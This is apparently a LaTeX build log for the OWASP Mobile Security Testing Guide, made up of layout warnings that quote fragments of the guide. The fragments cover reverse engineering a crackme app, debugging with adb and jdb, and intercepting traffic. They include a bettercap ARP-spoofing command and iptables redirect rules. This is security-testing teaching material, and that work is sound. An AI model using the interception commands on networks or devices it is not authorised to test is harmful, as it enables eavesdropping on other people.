[]  \TU/SourceCodePro(6)/m/n/10.95 34 0x000005f4    NONE    FUNC Ljavax/crypto/
Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;[] 

Overfull \hbox (75.83946pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 35 0x000005fc    NONE    FUNC Ljavax/crypto/
Cipher.method.init(ILjava/security/Key;)V[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 36 0x00000604    NONE    FUNC Ljavax/crypto/
spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 sym.Lsg_vantagepoint_uncrackabl
e1_MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (189.71933pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 method.public.Lsg_vantagepoint_
uncrackable1_MainActivity.Lsg_vantagepoint_uncrackable1[] 

Overfull \hbox (97.73969pt too wide) in paragraph at lines 10575--10575
[]                                                        \TU/SourceCodePro(6)/
m/n/10.95 _MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 10583--10583
[]\TU/SourceCodePro(6)/m/n/10.95 [0x000009c8]> s sym.Lsg_vantagepoint_uncrackab
le1_MainActivity.method.verify_Landroid_view_View__V[] 
[174]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ff8101e999d5401645a7e1396652c25dd93ab67e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1d1be24e834cab37f189d60c9d349789b2bdb0ae.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/853fd16c4f9112caf782ed394cb3bbc36b10900e.
png" > [175]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/74c7cf937d32349f587ab60d3a77f769b2e7ba77.
png" > [176]
Overfull \hbox (40.79942pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f072d89ee hit12_0 unacceptable policyunsu
pported md algorithmvar bad valuec[] 
[177]
Overfull \hbox (34.22949pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f0732a91a hit12_1 unacceptableSearching 1
2 bytes: 75 6e 61 63 63 65 70 74 61[] 

Overfull \hbox (1978.94905pt too wide) in paragraph at lines 10741--10741
[]\TU/SourceCodePro(6)/m/n/10.95 {"address":"0x561f072c4223","size":12,"flag":"
hit14_1","content":"unacceptable policyunsupported md algorithmvar bad valuec0"
},{"address":"0x561f072c4275","size":12,"flag":"hit14_2","content":"unacceptabl
eSearching 12 bytes: 75 6e 61 63 63 65 70 74 61"},{"address":"0x561f072c42c8","
size":12,"flag":"hit14_3","content":"unacceptableSearching 12 bytes: 75 6e 61 6
3 63 65 70 74 61 "},[] 
[178] [179]
Overfull \hbox (9.28828pt too wide) in paragraph at lines 10877--10882
[]\TU/SourceSansPro(0)/m/n/10.95 Disconnect the USB cable from the target devic
e and run \TU/SourceCodePro(6)/m/n/10.95 adb connect <device_ip_address>\TU/Sou
rceSansPro(0)/m/n/10.95 .
[180] [181]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3933903697e015a01f618c96228f42937b14019b.
png" > [182]
Overfull \hbox (34.2294pt too wide) in paragraph at lines 11037--11037
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded ... to sg.vp.owasp_mob
ile.omtg_android_preferences.xml[] 
[183]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c2929f644815f079c32d8d19c05474b920ef29ab.
png" > [184] [185] [186] [187] [188] [189]
Underfull \hbox (badness 3128) in paragraph at lines 11415--11419
[]\TU/SourceSansPro(0)/m/n/10.95 Here’s a non-exhaustive list of some info and 
the corresponding keywords that you can easily
[190]
Overfull \hbox (176.57875pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------  ----------------------
-----------------------------------------------------[] 

Overfull \hbox (36.41943pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 codeCacheDirectory      /data/user/0/sg.vp.owa
sp_mobile.omtg_android/code_cache[] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 externalCacheDirectory  /storage/emulated/0/An
droid/data/sg.vp.owasp_mobile.omtg_android/cache[] 

Overfull \hbox (62.69946pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir                  /storage/emulated/0/An
droid/obb/sg.vp.owasp_mobile.omtg_android[] 

Overfull \hbox (161.2494pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 packageCodePath         /data/app/sg.vp.owasp_
mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk[] 
[191]
Overfull \hbox (2.69832pt too wide) in paragraph at lines 11531--11535
[]\TU/SourceSansPro(0)/m/n/10.95 The internal data directory (aka. sandbox dire
ctory) which is at \TU/SourceCodePro(6)/m/n/10.95 /data/data/[package-name]
[192]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f313f719cdfa7959e664fd2e21f53a9fcf7d6866.
png" >
Overfull \hbox (12.3294pt too wide) in paragraph at lines 11651--11651
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 
[193]
Underfull \hbox (badness 1688) in paragraph at lines 11689--11691
[]\TU/SourceSansPro(0)/m/n/10.95 In certain production builds, you might encoun
ter an error \TU/SourceCodePro(6)/m/n/10.95 mount: []/system[] not in

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:06.590751 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:09.659658 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:10.579795 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 
[194]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d900623abe71b16708fe18ac2b6f64bad8a52940.
png" > [195]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7f691aaaf6ec47de147328a7a97e7bc6d8783ba2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/16c05811ca4e956a31e4a7bb5b376b9395fa16e7.
png" > [196] [197]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2e818595a18a1cfbf5f33ff73d6c378862712b89.
png" > [198]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9cdb0f9a684dd8350455778005a9452a8ce54d1f.
png" > [199]
Overfull \hbox (7.0698pt too wide) in paragraph at lines 12016--12027
[]\TU/SourceSansPro(0)/m/n/10.95 Some application (e.g. the [][]Chrome browser[
][]) may show \TU/SourceCodePro(6)/m/n/10.95 NET::ERR_CERT_VALIDITY_TOO_LONG
[200] [201] [202] [203] [204] [205]
Overfull \hbox (8.78668pt too wide) in paragraph at lines 12368--12370
[]\TU/SourceSansPro(0)/m/n/10.95 For both solutions you need to activate “Suppo
rt invisible proxying” in Burp, in Proxy Tab/Options/Edit

Overfull \hbox (99.9294pt too wide) in paragraph at lines 12380--12380
[]\TU/SourceCodePro(6)/m/n/10.95 $ iptables -t nat -A OUTPUT -p tcp --dport 80 
-j DNAT --to-destination <Your-Proxy-IP>:8080[] 

Overfull \hbox (88.97955pt too wide) in paragraph at lines 12404--12404
[]\TU/SourceCodePro(6)/m/n/10.95 DNAT       tcp  --  anywhere             anywh
ere             tcp dpt:5288 to:<Your-Proxy-IP>:8080[] 
[206]
Overfull \hbox (347.39938pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 $ sudo bettercap -eval "set arp.spoof.targets 
X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex tr
ue;"[] 

Overfull \hbox (97.73944pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 bettercap v2.22 (built for darwin amd64 with g
o1.12.1) [type []help[] for a list of commands][] 

Overfull \hbox (10.13943pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 [19:21:39] [sys.log] [inf] arp.spoof arp spoof
er started, probing 1 targets.[] 
[207]
Underfull \hbox (badness 10000) in paragraph at lines 12495--12498
[]\TU/SourceSansPro(0)/m/n/10.95 Basic Network Security Configuration - [][]$[]
[][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][] [] [][][][][][] [] [
][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 12498--12502
[][][] [] [][][][] [] [][][][] [] [][] [] [][] [] [] [][] [][][][][][][][] [][]
 [][][][][][][][] [][] [][][][][] [][] [][] [][] [][][][][][][] [][] [][][][][]
[][][] [][] [][][][][][][][][][][][][] [][] [][] [][] [][][][][][][] [][]

Underfull \hbox (badness 4543) in paragraph at lines 12526--12529
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences APIs - [][]$[][][][][] [] []
 [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][][
][][][] [] [][][][] [][] [][][][][][][] [] [][][][][][] [][]
[208]
Underfull \hbox (badness 4217) in paragraph at lines 12552--12555
[]\TU/SourceSansPro(0)/m/n/10.95 Android NDK Downloads - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][][] [] [][][][][][] [][]
[209] [210]
Underfull \hbox (badness 1968) in paragraph at lines 12721--12733
\TU/SourceSansPro(0)/m/n/10.95 readable. Fortunately, Java decompilers generall
y handle Android bytecode well. Popular free
[211] [212]
Overfull \hbox (196.28934pt too wide) in paragraph at lines 12839--12839
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b7218223963e160bb23b8740d81da1ec9ba40306.
png" > [213] [214]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6dcc613ab62a7f54560f516bce94dc562a5ec576.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/576f6aa1d427f2ec67695539e120520535f6d392.
jpg" > [215]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8ff26bdbf1d75df81f76e8179d0c8eaa03841b67.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/479365e620ef5d468ce30bee9120b9223109e90f.
jpg" > [216] [217]
Overfull \hbox (215.99933pt too wide) in paragraph at lines 13011--13011
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8e08bca1d4ad633b71205ea22c4c17cafa6cd2bb.
png" > [218]
Overfull \hbox (69.5245pt too wide) in paragraph at lines 13054--13054
\TU/SourceCodePro(6)/m/n/10 ((TextView)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU
/SourceCodePro(6)/m/n/10 .[]findViewById[]([]2131427422[])).[]setText[]((CharSe
quence)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU/SourceCodePro(6)/m/n/10 .[]stri
ngFromJNI[]());|  

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9fc57a40d76503de64f69b4bd6de61b4ccf8932f.
jpg" > [219]
Overfull \hbox (205.04945pt too wide) in paragraph at lines 13103--13103
[]     \TU/SourceCodePro(6)/m/n/10.95 3: 00004e49   112 FUNC    GLOBAL DEFAULT 
  11 Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI[] 

Overfull \hbox (205.04936pt too wide) in paragraph at lines 13110--13110
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 
[220]
Overfull \hbox (76.03288pt too wide) in paragraph at lines 13153--13159
[]\TU/SourceSansPro(0)/m/n/10.95 To open the file in radare2 you only have to r
un \TU/SourceCodePro(6)/m/n/10.95 r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative
-lib.so\TU/SourceSansPro(0)/m/n/10.95 .
[221] [222]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f8c639e93e6960d7f50c243f52229fc18cdcde3.
jpg" > [223]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8de449706bf63265be48bd835aa227612a1e921f.
png" > [224]
Underfull \hbox (badness 2884) in paragraph at lines 13348--13357
\TU/SourceSansPro(0)/m/n/10.95 such as Ghidra or Cutter or rely on CLI-based to
ols such as the \TU/SourceSansPro(0)/m/it/10.95 strings \TU/SourceSansPro(0)/m/
n/10.95 Unix utility (\TU/SourceCodePro(6)/m/n/10.95 strings
[225] [226]
Overfull \hbox (38.26028pt too wide) in paragraph at lines 13474--13482
\TU/SourceSansPro(0)/m/n/10.95 along is a good practice. Open the \TU/SourceCod
ePro(6)/m/n/10.95 MainActivity \TU/SourceSansPro(0)/m/n/10.95 class in the pack
age \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1\TU/SourceSansPr
o(0)/m/n/10.95 .

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/89f4493dc543c8aac3d5832072600f0f501870e7.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ceae72251f9dfa7c124c9f3ddaaf620a54091696.
jpg" > [227]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 13515--13515
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 

Overfull \hbox (29.02097pt too wide) in paragraph at lines 13532--13538
[]\TU/SourceSansPro(0)/m/n/10.95 So, you have a Base64-encoded String that’s pa
ssed to the function \TU/SourceCodePro(6)/m/n/10.95 a \TU/SourceSansPro(0)/m/n/
10.95 in the package \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.a.a
[228]
Overfull \hbox (205.04936pt too wide) in paragraph at lines 13583--13583
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (124.01958pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, aav.0x00000f3c      ; [0xe84:4]=0xf3c aav.0x00000f3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 
[229]
Overfull \hbox (134.96938pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 $ r2 -qc []e emu.str=true; s 0x00000e78; af; p
df[] HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (23.2796pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, [0x00000e84]        ; [0xe84:4]=0xf3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 

Overfull \hbox (174.74588pt too wide) in paragraph at lines 13652--13661
\TU/SourceSansPro(0)/m/n/10.95 dialog. Enter “java” and hit enter. This should 
highlight the \TU/SourceCodePro(6)/m/n/10.95 Java_sg_vantagepoint_helloworld_Ma
inActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/863e10b9775e05477765e9cefdc94ea46693a266.
jpg" > [230]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c96d983d30cbabc7d3d5c2c7951de81c61d650c5.
png" > [231]
Overfull \hbox (190.5771pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 fined functions: \TU/SourceCodePro(6)/m/n/10.95 
FUN_001004d0\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 FUN
_0010051c\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Ja
va_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\TU/SourceSansPro(0)
/m/n/10.95 .

Overfull \hbox (71.98134pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 The instructions in the function \TU/SourceCodeP
ro(6)/m/n/10.95 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a910215ed46dba7e8f1cef010443d3ffce923f4a.
png" > [232] [233] [234]
Overfull \hbox (139.3496pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  txt       REG     
        259,11     23968        399 /system/bin/app_process64[] 

Overfull \hbox (299.21967pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem   unknown     
                                    /dev/ashmem/dalvik-main space (region space
) (deleted)[] 

Overfull \hbox (314.54955pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   2797568    1146914 /data/dalvik-cache/arm64/system@framework@b
oot.art[] 

Overfull \hbox (393.38951pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   1081344    1146915 /data/dalvik-cache/arm64/system@framework@b
oot-core-libart.art[] 
[235]
Overfull \hbox (30.91528pt too wide) in paragraph at lines 13943--13949
[]\TU/SourceSansPro(0)/m/n/10.95 You can find system-wide networking informatio
n in \TU/SourceCodePro(6)/m/n/10.95 /proc/net \TU/SourceSansPro(0)/m/n/10.95 or
 just by inspecting the \TU/SourceCodePro(6)/m/n/10.95 /proc/<pid>/net

Overfull \hbox (110.87944pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 sl  local_address rem_address   st tx_queue rx
_queue tr tm->when retrnsmt   uid  timeout inode[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 69: 1101A8C0:BB2F 9A447D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75412 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 70: 1101A8C0:917C E3CB3AD8:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75553 1 0000000000000000 20 3 23 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 71: 1101A8C0:C1E3 9C187D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75458 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (88.97958pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 Proto Recv-Q Send-Q Local Address           Fo
reign Address         State       PID/Program Name[] 

Overfull \hbox (209.42949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47368      17
2.217.194.103:https   CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (207.23949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47233      17
2.217.194.94:https    CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38480      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (205.0495pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:44833      74
.125.24.91:https      ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38481      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 
[236]
Overfull \hbox (281.69955pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 12c00000-52c00000 rw-p 00000000 00:04 14917   
                           /dev/ashmem/dalvik-main space (region space) (delete
d)[] 

Overfull \hbox (268.55952pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 6f019000-6f2c0000 rw-p 00000000 fd:00 1146914 
                           /data/dalvik-cache/arm64/system@framework@boot.art[]
 

Overfull \hbox (454.70943pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 7327670000-7329747000 r--p 00000000 fd:00 1884
627                        /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jk
IMQ==/oat/arm64/base.odex[] 

Overfull \hbox (579.53937pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 733494d000-7334cfb000 r-xp 00000000 fd:00 1884
542                        /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf
-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so[] 

Overfull \hbox (13.20181pt too wide) in paragraph at lines 14033--14038
[]\TU/SourceSansPro(0)/m/n/10.95 The application data is stored in a sandboxed 
directory present at \TU/SourceCodePro(6)/m/n/10.95 /data/data/<app_package_nam
e>\TU/SourceSansPro(0)/m/n/10.95 .
[237] [238]
Overfull \hbox (24.42918pt too wide) in paragraph at lines 14141--14149
[]\TU/SourceSansPro(0)/m/n/10.95 Review the code and you’ll see that the method
 \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1.MainActivity.a
[239]
Overfull \hbox (64.88939pt too wide) in paragraph at lines 14175--14175
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 

Overfull \hbox (64.88939pt too wide) in paragraph at lines 14197--14197
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 
[240] [241]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e72654a6a7c90c6599aa37ed6e7a31b0b4a8953c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d706835a0a613f7a1c3657d0e4f6cef4a1eb2fd4.
png" > [242]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/06ba7913ac1a2b0a4aa6772f5a46f958090cfcf4.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88882390b46ffa938d25cc2171b9d17ae601e321.
png" > [243]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" > [244]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be767c8387e4fa818e0d2472725ba354bbed9963.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/41267d580ddfdde69914ed30df95961c12bcccd2.
png" > [245]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2227ece3978c331f17f61ab16971637b28978e2b.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/436e8051f1cc1455cba06b72c3b43af389e741a0.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/355be076b7f1150d56bfc6db6f006e480d86342c.
png" > [246]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6fb02bb0034224ded58a891172cdf90fac1b99c2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e25a98359ba7bd5a62406e7235ab1a6aa4d784e1.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b6d5a67bd3b76357dc552be5af26f9719a0a5d2.
png" > [247]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1335eef4fd499e31b736d73fe8df57f38edc11a2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d0f6dbdba327db2d0324dd91e49a89bfbca238ff.
png" > [248]
Overfull \hbox (62.69943pt too wide) in paragraph at lines 14488--14488
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a164   12690 201   1533400 51692 ffffffff 0
0000000 S sg.vantagepoint.helloworldjni[] 
[249]
Overfull \hbox (16.70944pt too wide) in paragraph at lines 14510--14510
[]\TU/SourceCodePro(6)/m/n/10.95 Reading symbols from libnative-lib.so...(no de
bugging symbols found)...done.[] 

Overfull \hbox (280.79056pt too wide) in paragraph at lines 14521--14529
[]\TU/SourceSansPro(0)/m/n/10.95 Our objective is to set a breakpoint at the fi
rst instruction of the native function \TU/SourceCodePro(6)/m/n/10.95 Java_sg_v
antagepoint_helloworldjni_MainActivity_stringFromJNI

Underfull \hbox (badness 2245) in paragraph at lines 14541--14548
\TU/SourceSansPro(0)/m/n/10.95 point at the \TU/SourceCodePro(6)/m/n/10.95 java
.lang.System.loadLibrary \TU/SourceSansPro(0)/m/n/10.95 method and resume the p
rocess. After the

Overfull \hbox (25.46939pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", java.lang.Syste
m.loadLibrary(), line=988 bci=0[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Step completed: "thread=main", sg.vantagepoint
.helloworldjni.MainActivity.<clinit>(), line=12 bci=5[] 
[250]
Overfull \hbox (10.1394pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 > stop in com.acme.bob.mobile.android.core.Bob
MobileApplication.<clinit>()[] 

Overfull \hbox (91.16939pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Deferring breakpoint com.acme.bob.mobile.andro
id.core.BobMobileApplication.<clinit>().[] 

Overfull \hbox (102.11937pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Set deferred breakpoint com.acme.bob.mobile.an
droid.core.BobMobileApplication.<clinit>()[] 
[251]
Overfull \hbox (242.27934pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", com.acme.bob.mo
bile.android.core.BobMobileApplication.<clinit>(), line=44 bci=0[] 
[252]
Overfull \hbox (393.38942pt too wide) in paragraph at lines 14676--14676
[]\TU/SourceCodePro(6)/m/n/10.95 $ while true; do pid=$(pgrep []target_process[
] | head -1); if [[ -n "$pid" ]]; then strace -s 2000 - e "!read" -ff -p "$pid"
; break; fi; done[] 
[253]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/edb98d4210c76f2964570cb2d22ab456c3330ccb.
png" > [254] [255] [256]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fb1b26788aead664e5a0f41c958b592f8669d389.
png" > [257]
Overfull \hbox (294.83939pt too wide) in paragraph at lines 14947--14947
[]\TU/SourceCodePro(6)/m/n/10.95 $ emulator -show-kernel -avd Nexus_4_API_19 -s
napshot default-boot -no-snapshot-save -qemu -d in_asm,cpu 2>/tmp/qemu.log[] 
[258] [259]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/43b2caf15e7d55029ae04597beb74c2ca7c74342.
png" >
Underfull \hbox (badness 10000) in paragraph at lines 15093--15095
[][] \TU/SourceSansPro(0)/m/n/10.95 Disassem-
[260]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9a7d2d1f4cd59ad389154d6c3aae7dad92f39e7.
png" > [261]
Underfull \hbox (badness 1715) in paragraph at lines 15109--15117
